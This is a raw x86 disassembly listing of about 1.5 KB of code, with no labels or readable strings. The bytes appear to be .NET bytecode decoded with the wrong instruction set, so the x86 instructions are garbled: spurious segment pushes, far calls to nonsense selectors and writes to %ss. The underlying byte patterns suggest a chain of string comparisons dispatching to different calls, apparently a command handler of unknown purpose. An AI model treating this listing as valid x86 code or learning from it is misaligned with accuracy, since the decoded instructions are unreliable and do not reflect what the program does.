  4030f6:	00 0e                	add    %cl,(%esi)
  4030f8:	25 00 00 01 22       	and    $0x22010000,%eax
  4030fd:	28 29                	sub    %ch,(%ecx)
  4030ff:	00 00                	add    %al,(%eax)
  403101:	06                   	push   %es
  403102:	2b 00                	sub    (%eax),%eax
  403104:	2a 00                	sub    (%eax),%al
  403106:	00 00                	add    %al,(%eax)
  403108:	3a 02                	cmp    (%edx),%al
  40310a:	74 09                	je     0x403115
  40310c:	00 00                	add    %al,(%eax)
  40310e:	1b 28                	sbb    (%eax),%ebp
  403110:	24 00                	and    $0x0,%al
  403112:	00 06                	add    %al,(%esi)
  403114:	2b 00                	sub    (%eax),%eax
  403116:	2a 00                	sub    (%eax),%al
  403118:	1e                   	push   %ds
  403119:	02 28                	add    (%eax),%ch
  40311b:	17                   	pop    %ss
  40311c:	00 00                	add    %al,(%eax)
  40311e:	0a 2a                	or     (%edx),%ch
  403120:	1b 30                	sbb    (%eax),%esi
  403122:	08 00                	or     %al,(%eax)
  403124:	8a 07                	mov    (%edi),%al
  403126:	00 00                	add    %al,(%eax)
  403128:	1d 00 00 11 02       	sbb    $0x2110000,%eax
  40312d:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  403131:	06                   	push   %es
  403132:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  403136:	06                   	push   %es
  403137:	7e 0a                	jle    0x403143
  403139:	00 00                	add    %al,(%eax)
  40313b:	04 15                	add    $0x15,%al
  40313d:	16                   	push   %ss
  40313e:	28 80 00 00 0a 0a    	sub    %al,0xa0a0000(%eax)
  403144:	06                   	push   %es
  403145:	16                   	push   %ss
  403146:	9a 13 13 11 13 72 ab 	lcall  $0xab72,$0x13111313
  40314d:	03 00                	add    (%eax),%eax
  40314f:	70 16                	jo     0x403167
  403151:	28 4a 00             	sub    %cl,0x0(%edx)
  403154:	00 0a                	add    %cl,(%edx)
  403156:	16                   	push   %ss
  403157:	33 2f                	xor    (%edi),%ebp
  403159:	16                   	push   %ss
  40315a:	80 19 00             	sbbb   $0x0,(%ecx)
  40315d:	00 04 72             	add    %al,(%edx,%esi,2)
  403160:	ab                   	stos   %eax,%es:(%edi)
  403161:	03 00                	add    (%eax),%eax
  403163:	70 7e                	jo     0x4031e3
  403165:	0a 00                	or     (%eax),%al
  403167:	00 04 7e             	add    %al,(%esi,%edi,2)
  40316a:	18 00                	sbb    %al,(%eax)
  40316c:	00 04 28             	add    %al,(%eax,%ebp,1)
  40316f:	75 00                	jne    0x403171
  403171:	00 0a                	add    %cl,(%edx)
  403173:	28 4f 00             	sub    %cl,0x0(%edi)
  403176:	00 0a                	add    %cl,(%edx)
  403178:	28 25 00 00 06 16    	sub    %ah,0x16060000
  40317e:	80 18 00             	sbbb   $0x0,(%eax)
  403181:	00 04 38             	add    %al,(%eax,%edi,1)
  403184:	10 07                	adc    %al,(%edi)
  403186:	00 00                	add    %al,(%eax)
  403188:	11 13                	adc    %edx,(%ebx)
  40318a:	72 b5                	jb     0x403141
  40318c:	03 00                	add    (%eax),%eax
  40318e:	70 16                	jo     0x4031a6
  403190:	28 4a 00             	sub    %cl,0x0(%edx)
  403193:	00 0a                	add    %cl,(%edx)
  403195:	16                   	push   %ss
  403196:	33 15 28 56 00 00    	xor    0x5628,%edx
  40319c:	06                   	push   %es
  40319d:	28 81 00 00 0a 16    	sub    %al,0x160a0000(%ecx)
  4031a3:	28 23                	sub    %ah,(%ebx)
  4031a5:	00 00                	add    %al,(%eax)
  4031a7:	0a 38                	or     (%eax),%bh
  4031a9:	eb 06                	jmp    0x4031b1
  4031ab:	00 00                	add    %al,(%eax)
  4031ad:	11 13                	adc    %edx,(%ebx)
  4031af:	72 bd                	jb     0x40316e
  4031b1:	03 00                	add    (%eax),%eax
  4031b3:	70 16                	jo     0x4031cb
  4031b5:	28 4a 00             	sub    %cl,0x0(%edx)
  4031b8:	00 0a                	add    %cl,(%edx)
  4031ba:	16                   	push   %ss
  4031bb:	33 20                	xor    (%eax),%esp
  4031bd:	7e 10                	jle    0x4031cf
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	04 18                	add    $0x18,%al
  4031c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4031c4:	82 00 00             	addb   $0x0,(%eax)
  4031c7:	0a 7e 10             	or     0x10(%esi),%bh
  4031ca:	00 00                	add    %al,(%eax)
  4031cc:	04 6f                	add    $0x6f,%al
  4031ce:	7c 00                	jl     0x4031d0
  4031d0:	00 0a                	add    %cl,(%edx)
  4031d2:	16                   	push   %ss
  4031d3:	28 23                	sub    %ah,(%ebx)
  4031d5:	00 00                	add    %al,(%eax)
  4031d7:	0a 38                	or     (%eax),%bh
  4031d9:	bb 06 00 00 11       	mov    $0x11000006,%ebx
  4031de:	13 72 c9             	adc    -0x37(%edx),%esi
  4031e1:	03 00                	add    (%eax),%eax
  4031e3:	70 16                	jo     0x4031fb
  4031e5:	28 4a 00             	sub    %cl,0x0(%edx)
  4031e8:	00 0a                	add    %cl,(%edx)
  4031ea:	16                   	push   %ss
  4031eb:	33 0d 16 14 14 28    	xor    0x28141416,%ecx
  4031f1:	3c 00                	cmp    $0x0,%al
  4031f3:	00 06                	add    %al,(%esi)
  4031f5:	38 9e 06 00 00 11    	cmp    %bl,0x11000006(%esi)
  4031fb:	13 72 dd             	adc    -0x23(%edx),%esi
  4031fe:	03 00                	add    (%eax),%eax
  403200:	70 16                	jo     0x403218
  403202:	28 4a 00             	sub    %cl,0x0(%edx)
  403205:	00 0a                	add    %cl,(%edx)
  403207:	16                   	push   %ss
  403208:	33 1b                	xor    (%ebx),%ebx
  40320a:	17                   	pop    %ss
  40320b:	06                   	push   %es
  40320c:	17                   	pop    %ss
  40320d:	9a 06 18 9a 28 83 00 	lcall  $0x83,$0x289a1806
  403214:	00 0a                	add    %cl,(%edx)
  403216:	28 51 00             	sub    %dl,0x0(%ecx)
  403219:	00 06                	add    %al,(%esi)
  40321b:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  40321e:	00 06                	add    %al,(%esi)
  403220:	38 73 06             	cmp    %dh,0x6(%ebx)
  403223:	00 00                	add    %al,(%eax)
  403225:	11 13                	adc    %edx,(%ebx)
  403227:	72 eb                	jb     0x403214
  403229:	03 00                	add    (%eax),%eax
  40322b:	70 16                	jo     0x403243
  40322d:	28 4a 00             	sub    %cl,0x0(%edx)
  403230:	00 0a                	add    %cl,(%edx)
  403232:	16                   	push   %ss
  403233:	33 1a                	xor    (%edx),%ebx
  403235:	06                   	push   %es
  403236:	17                   	pop    %ss
  403237:	9a 06 18 9a 28 83 00 	lcall  $0x83,$0x289a1806
  40323e:	00 0a                	add    %cl,(%edx)
  403240:	28 51 00             	sub    %dl,0x0(%ecx)
  403243:	00 06                	add    %al,(%esi)
  403245:	28 37                	sub    %dh,(%edi)
  403247:	00 00                	add    %al,(%eax)
  403249:	06                   	push   %es
  40324a:	38 49 06             	cmp    %cl,0x6(%ecx)
  40324d:	00 00                	add    %al,(%eax)
  40324f:	11 13                	adc    %edx,(%ebx)
  403251:	72 f1                	jb     0x403244
  403253:	03 00                	add    (%eax),%eax
  403255:	70 16                	jo     0x40326d
  403257:	28 4a 00             	sub    %cl,0x0(%edx)
  40325a:	00 0a                	add    %cl,(%edx)
  40325c:	16                   	push   %ss
  40325d:	33 18                	xor    (%eax),%ebx
  40325f:	06                   	push   %es
  403260:	17                   	pop    %ss
  403261:	9a 28 83 00 00 0a 28 	lcall  $0x280a,$0x8328
  403268:	51                   	push   %ecx
  403269:	00 00                	add    %al,(%eax)
  40326b:	06                   	push   %es
  40326c:	28 38                	sub    %bh,(%eax)
  40326e:	00 00                	add    %al,(%eax)
  403270:	06                   	push   %es
  403271:	26 38 21             	cmp    %ah,%es:(%ecx)
  403274:	06                   	push   %es
  403275:	00 00                	add    %al,(%eax)
  403277:	11 13                	adc    %edx,(%ebx)
  403279:	72 f7                	jb     0x403272
  40327b:	03 00                	add    (%eax),%eax
  40327d:	70 16                	jo     0x403295
  40327f:	28 4a 00             	sub    %cl,0x0(%edx)
  403282:	00 0a                	add    %cl,(%edx)
  403284:	16                   	push   %ss
  403285:	33 5d 17             	xor    0x17(%ebp),%ebx
  403288:	28 84 00 00 0a 20 00 	sub    %al,0x200a00(%eax,%eax,1)
  40328f:	0c 00                	or     $0x0,%al
  403291:	00 28                	add    %ch,(%eax)
  403293:	85 00                	test   %eax,(%eax)
  403295:	00 0a                	add    %cl,(%edx)
  403297:	20 0f                	and    %cl,(%edi)
  403299:	27                   	daa
  40329a:	00 00                	add    %al,(%eax)
  40329c:	28 86 00 00 0a de    	sub    %al,-0x21f60000(%esi)
  4032a2:	0c 28                	or     $0x28,%al
  4032a4:	22 00                	and    (%eax),%al
  4032a6:	00 0a                	add    %cl,(%edx)
  4032a8:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4032ab:	00 0a                	add    %cl,(%edx)
  4032ad:	de 00                	fiadds (%eax)
  4032af:	28 87 00 00 0a 1c    	sub    %al,0x1c0a0000(%edi)
  4032b5:	28 42 00             	sub    %al,0x0(%edx)
  4032b8:	00 06                	add    %al,(%esi)
  4032ba:	06                   	push   %es
  4032bb:	17                   	pop    %ss
  4032bc:	9a 28 42 00 00 0a 28 	lcall  $0x280a,$0x4228
  4032c3:	88 00                	mov    %al,(%eax)
  4032c5:	00 0a                	add    %cl,(%edx)
  4032c7:	0b 73 89             	or     -0x77(%ebx),%esi
  4032ca:	00 00                	add    %al,(%eax)
  4032cc:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4032cf:	06                   	push   %es
  4032d0:	18 9a 07 6f 8a 00    	sbb    %bl,0x8a6f07(%edx)
  4032d6:	00 0a                	add    %cl,(%edx)
  4032d8:	07                   	pop    %es
  4032d9:	28 8b 00 00 0a 26    	sub    %cl,0x260a0000(%ebx)
  4032df:	38 b4 05 00 00 11 13 	cmp    %dh,0x13110000(%ebp,%eax,1)
  4032e6:	72 fd                	jb     0x4032e5
  4032e8:	03 00                	add    (%eax),%eax
  4032ea:	70 16                	jo     0x403302
  4032ec:	28 4a 00             	sub    %cl,0x0(%edx)
  4032ef:	00 0a                	add    %cl,(%edx)
  4032f1:	16                   	push   %ss
  4032f2:	33 0e                	xor    (%esi),%ecx
  4032f4:	06                   	push   %es
  4032f5:	17                   	pop    %ss
  4032f6:	9a 16 28 33 00 00 06 	lcall  $0x600,$0x332816
  4032fd:	38 96 05 00 00 11    	cmp    %dl,0x11000005(%esi)
  403303:	13 72 0d             	adc    0xd(%edx),%esi
  403306:	04 00                	add    $0x0,%al
  403308:	70 16                	jo     0x403320
  40330a:	28 4a 00             	sub    %cl,0x0(%edx)
  40330d:	00 0a                	add    %cl,(%edx)
  40330f:	16                   	push   %ss
  403310:	33 0e                	xor    (%esi),%ecx
  403312:	06                   	push   %es
  403313:	17                   	pop    %ss
  403314:	9a 17 28 33 00 00 06 	lcall  $0x600,$0x332817
  40331b:	38 78 05             	cmp    %bh,0x5(%eax)
  40331e:	00 00                	add    %al,(%eax)
  403320:	11 13                	adc    %edx,(%ebx)
  403322:	72 1d                	jb     0x403341
  403324:	04 00                	add    $0x0,%al
  403326:	70 16                	jo     0x40333e
  403328:	28 4a 00             	sub    %cl,0x0(%edx)
  40332b:	00 0a                	add    %cl,(%edx)
  40332d:	16                   	push   %ss
  40332e:	33 13                	xor    (%ebx),%edx
  403330:	72 33                	jb     0x403365
  403332:	04 00                	add    $0x0,%al
  403334:	70 16                	jo     0x40334c
  403336:	16                   	push   %ss
  403337:	15 28 8c 00 00       	adc    $0x8c28,%eax
  40333c:	0a 26                	or     (%esi),%ah
  40333e:	38 55 05             	cmp    %dl,0x5(%ebp)
  403341:	00 00                	add    %al,(%eax)
  403343:	11 13                	adc    %edx,(%ebx)
  403345:	72 63                	jb     0x4033aa
  403347:	04 00                	add    $0x0,%al
  403349:	70 16                	jo     0x403361
  40334b:	28 4a 00             	sub    %cl,0x0(%edx)
  40334e:	00 0a                	add    %cl,(%edx)
  403350:	16                   	push   %ss
  403351:	33 13                	xor    (%ebx),%edx
  403353:	72 77                	jb     0x4033cc
  403355:	04 00                	add    $0x0,%al
  403357:	70 16                	jo     0x40336f
  403359:	16                   	push   %ss
  40335a:	15 28 8c 00 00       	adc    $0x8c28,%eax
  40335f:	0a 26                	or     (%esi),%ah
  403361:	38 32                	cmp    %dh,(%edx)
  403363:	05 00 00 11 13       	add    $0x13110000,%eax
  403368:	72 a7                	jb     0x403311
  40336a:	04 00                	add    $0x0,%al
  40336c:	70 16                	jo     0x403384
  40336e:	28 4a 00             	sub    %cl,0x0(%edx)
  403371:	00 0a                	add    %cl,(%edx)
  403373:	16                   	push   %ss
  403374:	33 13                	xor    (%ebx),%edx
  403376:	72 b9                	jb     0x403331
  403378:	04 00                	add    $0x0,%al
  40337a:	70 16                	jo     0x403392
  40337c:	16                   	push   %ss
  40337d:	15 28 8c 00 00       	adc    $0x8c28,%eax
  403382:	0a 26                	or     (%esi),%ah
  403384:	38 0f                	cmp    %cl,(%edi)
  403386:	05 00 00 11 13       	add    $0x13110000,%eax
  40338b:	72 d9                	jb     0x403366
  40338d:	04 00                	add    $0x0,%al
  40338f:	70 16                	jo     0x4033a7
  403391:	28 4a 00             	sub    %cl,0x0(%edx)
  403394:	00 0a                	add    %cl,(%edx)
  403396:	16                   	push   %ss
  403397:	33 11                	xor    (%ecx),%edx
  403399:	06                   	push   %es
  40339a:	17                   	pop    %ss
  40339b:	9a 16 16 15 28 8c 00 	lcall  $0x8c,$0x28151616
  4033a2:	00 0a                	add    %cl,(%edx)
  4033a4:	26 38 ee             	es cmp %ch,%dh
  4033a7:	04 00                	add    $0x0,%al
  4033a9:	00 11                	add    %dl,(%ecx)
  4033ab:	13 72 eb             	adc    -0x15(%edx),%esi
  4033ae:	04 00                	add    $0x0,%al
  4033b0:	70 16                	jo     0x4033c8
  4033b2:	28 4a 00             	sub    %cl,0x0(%edx)
  4033b5:	00 0a                	add    %cl,(%edx)
  4033b7:	16                   	push   %ss
  4033b8:	33 42 7e             	xor    0x7e(%edx),%eax
  4033bb:	1c 00                	sbb    $0x0,%al
  4033bd:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4033c0:	8d 00                	lea    (%eax),%eax
  4033c2:	00 0a                	add    %cl,(%edx)
  4033c4:	de 0e                	fimuls (%esi)
  4033c6:	25 28 22 00 00       	and    $0x2228,%eax
  4033cb:	0a 0d 28 24 00 00    	or     0x2428,%cl
  4033d1:	0a de                	or     %dh,%bl
  4033d3:	00 14 fe             	add    %dl,(%esi,%edi,8)
  4033d6:	06                   	push   %es
  4033d7:	39 00                	cmp    %eax,(%eax)
  4033d9:	00 06                	add    %al,(%esi)
  4033db:	73 70                	jae    0x40344d
  4033dd:	00 00                	add    %al,(%eax)
  4033df:	0a 73 71             	or     0x71(%ebx),%dh
  4033e2:	00 00                	add    %al,(%eax)
  4033e4:	0a 80 1c 00 00 04    	or     0x400001c(%eax),%al
  4033ea:	7e 1c                	jle    0x403408
  4033ec:	00 00                	add    %al,(%eax)
  4033ee:	04 06                	add    $0x6,%al
  4033f0:	17                   	pop    %ss
  4033f1:	9a 6f 8e 00 00 0a 38 	lcall  $0x380a,$0x8e6f
  4033f8:	9c                   	pushf
  4033f9:	04 00                	add    $0x0,%al
  4033fb:	00 11                	add    %dl,(%ecx)
  4033fd:	13 72 ff             	adc    -0x1(%edx),%esi
  403400:	04 00                	add    $0x0,%al
  403402:	70 16                	jo     0x40341a
  403404:	28 4a 00             	sub    %cl,0x0(%edx)
  403407:	00 0a                	add    %cl,(%edx)
  403409:	16                   	push   %ss
  40340a:	33 20                	xor    (%eax),%esp
  40340c:	7e 1c                	jle    0x40342a
  40340e:	00 00                	add    %al,(%eax)
  403410:	04 6f                	add    $0x6f,%al
  403412:	8d 00                	lea    (%eax),%eax
  403414:	00 0a                	add    %cl,(%edx)
  403416:	de 0f                	fimuls (%edi)
  403418:	25 28 22 00 00       	and    $0x2228,%eax
  40341d:	0a 13                	or     (%ebx),%dl
  40341f:	04 28                	add    $0x28,%al
  403421:	24 00                	and    $0x0,%al
  403423:	00 0a                	add    %cl,(%edx)
  403425:	de 00                	fiadds (%eax)
  403427:	38 6c 04 00          	cmp    %ch,0x0(%esp,%eax,1)
  40342b:	00 11                	add    %dl,(%ecx)
  40342d:	13 72 11             	adc    0x11(%edx),%esi
  403430:	05 00 70 16 28       	add    $0x28167000,%eax
  403435:	4a                   	dec    %edx
  403436:	00 00                	add    %al,(%eax)
  403438:	0a 16                	or     (%esi),%dl
  40343a:	33 43 7e             	xor    0x7e(%ebx),%eax
  40343d:	1d 00 00 04 6f       	sbb    $0x6f040000,%eax
  403442:	8d 00                	lea    (%eax),%eax
  403444:	00 0a                	add    %cl,(%edx)
  403446:	de 0f                	fimuls (%edi)
  403448:	25 28 22 00 00       	and    $0x2228,%eax
  40344d:	0a 13                	or     (%ebx),%dl
  40344f:	05 28 24 00 00       	add    $0x2428,%eax
  403454:	0a de                	or     %dh,%bl
  403456:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403459:	06                   	push   %es
  40345a:	3a 00                	cmp    (%eax),%al
  40345c:	00 06                	add    %al,(%esi)
  40345e:	73 70                	jae    0x4034d0
  403460:	00 00                	add    %al,(%eax)
  403462:	0a 73 71             	or     0x71(%ebx),%dh
  403465:	00 00                	add    %al,(%eax)
  403467:	0a 80 1d 00 00 04    	or     0x400001d(%eax),%al
  40346d:	7e 1d                	jle    0x40348c
  40346f:	00 00                	add    %al,(%eax)
  403471:	04 06                	add    $0x6,%al
  403473:	17                   	pop    %ss
  403474:	9a 6f 8e 00 00 0a 38 	lcall  $0x380a,$0x8e6f
  40347b:	19 04 00             	sbb    %eax,(%eax,%eax,1)
  40347e:	00 11                	add    %dl,(%ecx)
  403480:	13 72 29             	adc    0x29(%edx),%esi
  403483:	05 00 70 16 28       	add    $0x28167000,%eax
  403488:	4a                   	dec    %edx
  403489:	00 00                	add    %al,(%eax)
  40348b:	0a 16                	or     (%esi),%dl
  40348d:	33 20                	xor    (%eax),%esp
  40348f:	7e 1d                	jle    0x4034ae
  403491:	00 00                	add    %al,(%eax)
  403493:	04 6f                	add    $0x6f,%al
  403495:	8d 00                	lea    (%eax),%eax
  403497:	00 0a                	add    %cl,(%edx)
  403499:	de 0f                	fimuls (%edi)
  40349b:	25 28 22 00 00       	and    $0x2228,%eax
  4034a0:	0a 13                	or     (%ebx),%dl
  4034a2:	06                   	push   %es
  4034a3:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4034a6:	00 0a                	add    %cl,(%edx)
  4034a8:	de 00                	fiadds (%eax)
  4034aa:	38 e9                	cmp    %ch,%cl
  4034ac:	03 00                	add    (%eax),%eax
  4034ae:	00 11                	add    %dl,(%ecx)
  4034b0:	13 72 3f             	adc    0x3f(%edx),%esi
  4034b3:	05 00 70 16 28       	add    $0x28167000,%eax
  4034b8:	4a                   	dec    %edx
  4034b9:	00 00                	add    %al,(%eax)
  4034bb:	0a 16                	or     (%esi),%dl
  4034bd:	33 1e                	xor    (%esi),%ebx
  4034bf:	72 3f                	jb     0x403500
  4034c1:	05 00 70 7e 0a       	add    $0xa7e7000,%eax
  4034c6:	00 00                	add    %al,(%eax)
  4034c8:	04 28                	add    $0x28,%al
  4034ca:	4d                   	dec    %ebp
  4034cb:	00 00                	add    %al,(%eax)
  4034cd:	06                   	push   %es
  4034ce:	28 4f 00             	sub    %cl,0x0(%edi)
  4034d1:	00 0a                	add    %cl,(%edx)
  4034d3:	28 25 00 00 06 38    	sub    %ah,0x38060000
  4034d9:	bb 03 00 00 11       	mov    $0x11000003,%ebx
  4034de:	13 72 4b             	adc    0x4b(%edx),%esi
  4034e1:	05 00 70 16 28       	add    $0x28167000,%eax
  4034e6:	4a                   	dec    %edx
  4034e7:	00 00                	add    %al,(%eax)
  4034e9:	0a 16                	or     (%esi),%dl
  4034eb:	33 6a 1f             	xor    0x1f(%edx),%ebp
  4034ee:	25 28 8f 00 00       	and    $0x8f28,%eax
  4034f3:	0a 72 57             	or     0x57(%edx),%dh
  4034f6:	05 00 70 28 42       	add    $0x42287000,%eax
  4034fb:	00 00                	add    %al,(%eax)
  4034fd:	0a 13                	or     (%ebx),%dl
  4034ff:	07                   	pop    %es
  403500:	1d 8d 2d 00 00       	sbb    $0x2d8d,%eax
  403505:	01 13                	add    %edx,(%ebx)
  403507:	14 11                	adc    $0x11,%al
  403509:	14 16                	adc    $0x16,%al
  40350b:	72 4b                	jb     0x403558
  40350d:	05 00 70 a2 11       	add    $0x11a27000,%eax
  403512:	14 17                	adc    $0x17,%al
  403514:	7e 0a                	jle    0x403520
  403516:	00 00                	add    %al,(%eax)
  403518:	04 a2                	add    $0xa2,%al
  40351a:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  40351d:	28 4d 00             	sub    %cl,0x0(%ebp)
  403520:	00 06                	add    %al,(%esi)
  403522:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403527:	0a 00                	or     (%eax),%al
  403529:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40352c:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  40352f:	11 07                	adc    %eax,(%edi)
  403531:	a2 11 14 1b 7e       	mov    %al,0x7e1b1411
  403536:	0a 00                	or     (%eax),%al
  403538:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40353b:	11 14 1c             	adc    %edx,(%esp,%ebx,1)
  40353e:	11 07                	adc    %eax,(%edi)
  403540:	28 90 00 00 0a a2    	sub    %dl,-0x5df60000(%eax)
  403546:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403549:	7f 00                	jg     0x40354b
  40354b:	00 0a                	add    %cl,(%edx)
  40354d:	28 25 00 00 06 38    	sub    %ah,0x38060000
  403553:	41                   	inc    %ecx
  403554:	03 00                	add    (%eax),%eax
  403556:	00 11                	add    %dl,(%ecx)
  403558:	13 72 7d             	adc    0x7d(%edx),%esi
  40355b:	05 00 70 16 28       	add    $0x28167000,%eax
  403560:	4a                   	dec    %edx
  403561:	00 00                	add    %al,(%eax)
  403563:	0a 16                	or     (%esi),%dl
  403565:	40                   	inc    %eax
  403566:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403567:	00 00                	add    %al,(%eax)
  403569:	00 06                	add    %al,(%esi)
  40356b:	17                   	pop    %ss
  40356c:	9a 06 18 9a 28 91 00 	lcall  $0x91,$0x289a1806
  403573:	00 0a                	add    %cl,(%edx)
  403575:	1b 8d 2d 00 00 01    	sbb    0x100002d(%ebp),%ecx
  40357b:	13 14 11             	adc    (%ecx,%edx,1),%edx
  40357e:	14 16                	adc    $0x16,%al
  403580:	72 8b                	jb     0x40350d
  403582:	05 00 70 a2 11       	add    $0x11a27000,%eax
  403587:	14 17                	adc    $0x17,%al
  403589:	7e 0a                	jle    0x403595
  40358b:	00 00                	add    %al,(%eax)
  40358d:	04 a2                	add    $0xa2,%al
  40358f:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403592:	28 4d 00             	sub    %cl,0x0(%ebp)
  403595:	00 06                	add    %al,(%esi)
  403597:	a2 11 14 19 7e       	mov    %al,0x7e191411
  40359c:	0a 00                	or     (%eax),%al
  40359e:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4035a1:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  4035a4:	72 9d                	jb     0x403543
  4035a6:	05 00 70 a2 11       	add    $0x11a27000,%eax
  4035ab:	14 28                	adc    $0x28,%al
  4035ad:	7f 00                	jg     0x4035af
  4035af:	00 0a                	add    %cl,(%edx)
  4035b1:	28 25 00 00 06 de    	sub    %ah,0xde060000
  4035b7:	52                   	push   %edx
  4035b8:	25 28 22 00 00       	and    $0x2228,%eax
  4035bd:	0a 13                	or     (%ebx),%dl
  4035bf:	08 1b                	or     %bl,(%ebx)
  4035c1:	8d 2d 00 00 01 13    	lea    0x13010000,%ebp
  4035c7:	14 11                	adc    $0x11,%al
  4035c9:	14 16                	adc    $0x16,%al
  4035cb:	72 cb                	jb     0x403598
  4035cd:	05 00 70 a2 11       	add    $0x11a27000,%eax
  4035d2:	14 17                	adc    $0x17,%al
  4035d4:	7e 0a                	jle    0x4035e0
  4035d6:	00 00                	add    %al,(%eax)
  4035d8:	04 a2                	add    $0xa2,%al
  4035da:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  4035dd:	28 4d 00             	sub    %cl,0x0(%ebp)
  4035e0:	00 06                	add    %al,(%esi)
  4035e2:	a2 11 14 19 7e       	mov    %al,0x7e191411
  4035e7:	0a 00                	or     (%eax),%al
  4035e9:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4035ec:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  4035ef:	11 08                	adc    %ecx,(%eax)
  4035f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f2:	92                   	xchg   %eax,%edx
  4035f3:	00 00                	add    %al,(%eax)
  4035f5:	0a a2 11 14 28 7f    	or     0x7f281411(%edx),%ah
  4035fb:	00 00                	add    %al,(%eax)
  4035fd:	0a 28                	or     (%eax),%ch
  4035ff:	25 00 00 06 28       	and    $0x28060000,%eax
  403604:	24 00                	and    $0x0,%al
  403606:	00 0a                	add    %cl,(%edx)
  403608:	de 00                	fiadds (%eax)
  40360a:	38 89 02 00 00 11    	cmp    %cl,0x11000002(%ecx)
  403610:	13 72 dd             	adc    -0x23(%edx),%esi
  403613:	05 00 70 16 28       	add    $0x28167000,%eax
  403618:	4a                   	dec    %edx
  403619:	00 00                	add    %al,(%eax)
  40361b:	0a 16                	or     (%esi),%dl
  40361d:	33 0f                	xor    (%edi),%ecx
  40361f:	72 dd                	jb     0x4035fe
  403621:	05 00 70 28 25       	add    $0x25287000,%eax
  403626:	00 00                	add    %al,(%eax)
  403628:	06                   	push   %es
  403629:	38 6a 02             	cmp    %ch,0x2(%edx)
  40362c:	00 00                	add    %al,(%eax)
  40362e:	11 13                	adc    %edx,(%ebx)
  403630:	72 e7                	jb     0x403619
  403632:	05 00 70 16 28       	add    $0x28167000,%eax
  403637:	4a                   	dec    %edx
  403638:	00 00                	add    %al,(%eax)
  40363a:	0a 16                	or     (%esi),%dl
  40363c:	33 40 06             	xor    0x6(%eax),%eax
  40363f:	80 1a 00             	sbbb   $0x0,(%edx)
  403642:	00 04 06             	add    %al,(%esi,%eax,1)
  403645:	17                   	pop    %ss
  403646:	9a 28 50 00 00 06 2d 	lcall  $0x2d06,$0x5028
  40364d:	19 72 f5             	sbb    %esi,-0xb(%edx)
  403650:	05 00 70 7e 0a       	add    $0xa7e7000,%eax
  403655:	00 00                	add    %al,(%eax)
  403657:	04 06                	add    $0x6,%al
  403659:	17                   	pop    %ss
  40365a:	9a 28 4f 00 00 0a 28 	lcall  $0x280a,$0x4f28
  403661:	25 00 00 06 2b       	and    $0x2b060000,%eax
  403666:	12 06                	adc    (%esi),%al
  403668:	17                   	pop    %ss
  403669:	9a 28 50 00 00 06 28 	lcall  $0x2806,$0x5028
  403670:	51                   	push   %ecx
  403671:	00 00                	add    %al,(%eax)
  403673:	06                   	push   %es
  403674:	28 2e                	sub    %ch,(%esi)
  403676:	00 00                	add    %al,(%eax)
  403678:	06                   	push   %es
  403679:	38 1a                	cmp    %bl,(%edx)
  40367b:	02 00                	add    (%eax),%al
  40367d:	00 11                	add    %dl,(%ecx)
  40367f:	13 72 0b             	adc    0xb(%edx),%esi
  403682:	06                   	push   %es
  403683:	00 70 16             	add    %dh,0x16(%eax)
  403686:	28 4a 00             	sub    %cl,0x0(%edx)
  403689:	00 0a                	add    %cl,(%edx)
  40368b:	16                   	push   %ss
  40368c:	33 26                	xor    (%esi),%esp
  40368e:	06                   	push   %es
  40368f:	18 9a 28 83 00 00    	sbb    %bl,0x8328(%edx)
  403695:	0a 13                	or     (%ebx),%dl
  403697:	09 06                	or     %eax,(%esi)
  403699:	17                   	pop    %ss
  40369a:	9a 11 09 28 4f 00 00 	lcall  $0x0,$0x4f280911
  4036a1:	06                   	push   %es
  4036a2:	26 11 09             	adc    %ecx,%es:(%ecx)
  4036a5:	28 51 00             	sub    %dl,0x0(%ecx)
  4036a8:	00 06                	add    %al,(%esi)
  4036aa:	28 2e                	sub    %ch,(%esi)
  4036ac:	00 00                	add    %al,(%eax)
  4036ae:	06                   	push   %es
  4036af:	38 e4                	cmp    %ah,%ah
  4036b1:	01 00                	add    %eax,(%eax)
  4036b3:	00 11                	add    %dl,(%ecx)
  4036b5:	13 72 21             	adc    0x21(%edx),%esi
  4036b8:	06                   	push   %es
  4036b9:	00 70 16             	add    %dh,0x16(%eax)
  4036bc:	28 4a 00             	sub    %cl,0x0(%edx)
  4036bf:	00 0a                	add    %cl,(%edx)
  4036c1:	16                   	push   %ss
  4036c2:	33 28                	xor    (%eax),%ebp
  4036c4:	28 04 00             	sub    %al,(%eax,%eax,1)
  4036c7:	00 06                	add    %al,(%esi)
  4036c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4036ca:	93                   	xchg   %eax,%ebx
  4036cb:	00 00                	add    %al,(%eax)
  4036cd:	0a 6f 94             	or     -0x6c(%edi),%ch
  4036d0:	00 00                	add    %al,(%eax)
  4036d2:	0a 7e 22             	or     0x22(%esi),%bh
  4036d5:	00 00                	add    %al,(%eax)
  4036d7:	04 6f                	add    $0x6f,%al
  4036d9:	95                   	xchg   %eax,%ebp
  4036da:	00 00                	add    %al,(%eax)
  4036dc:	0a 72 3d             	or     0x3d(%edx),%dh
  4036df:	06                   	push   %es
  4036e0:	00 70 28             	add    %dh,0x28(%eax)
  4036e3:	2f                   	das
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	06                   	push   %es
